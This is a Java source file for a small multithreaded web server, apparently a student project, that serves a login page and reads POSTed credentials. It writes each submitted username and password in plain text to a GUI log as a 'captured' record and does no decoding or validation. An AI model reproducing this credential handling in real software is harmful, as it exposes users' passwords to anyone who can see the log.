package PWeb;

import GUI.ServidorPWeb.GUIPWeb;
import Server.MultiThreadServer;
import Server.UserData;
import Utils.RecursosWeb;
import Utils.SocketUtils;
import Utils.WebUtils;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.List;

public class ServerPWeb extends MultiThreadServer {
    private GUIPWeb guipWeb;

    public ServerPWeb(int port, GUIPWeb guipWeb){
        super(port);
        this.guipWeb = guipWeb;
    }
    @Override
    public void handleConnection(Socket connection) throws IOException {
        PrintWriter out = SocketUtils.getWriter(connection);
        BufferedReader in = SocketUtils.getReader(connection);
        String name = "Registro";
        List<String> inputLines = new ArrayList<>();
        String line;

        guipWeb.appendln("Se ha producido una nueva conexion.");
        try {
            //Se lee al usuario
            while ((line = in.readLine()) != null) {
                inputLines.add(line);
                System.out.println(line);
                if (line.isEmpty()) { // blank line
                    if (WebUtils.usingPost(inputLines)) { // If POST, one more line to read,
                        char[] data = new char[1000];    // with no CR at end.
                        int chars = in.read(data);       // Ignore multi-line posts, such as file uploads.
                        String postData = new String(data, 0, chars);
                        inputLines.add(postData);
                        String params[] = postData.split("[=&]");
                        if(params.length < 4){
                            WebUtils.printPage(out, name, RecursosWeb.getErrorLoginWeb());
                        }else {
                            WebUtils.printConfirmPage(out, name);
                            guipWeb.appendln("Nuevo registro capturado.");
                            guipWeb.appendln("User: " + params[1]);
                            guipWeb.appendln("Password: " + params[3]);
                            UserRegister userRegister = new UserRegister(params[1], params[3]);
                            userRegister.connect();
                        }
                    }else{
                        WebUtils.printPage(out, name, RecursosWeb.getLoginWeb());
                    }
                    break;
                }
            }

        }catch (SocketException e){
            //Este error surge se cancela el navegador a mitad de carga
            guipWeb.appendln("Ha surgido un fallo en la conexion.");
        }
    }
}
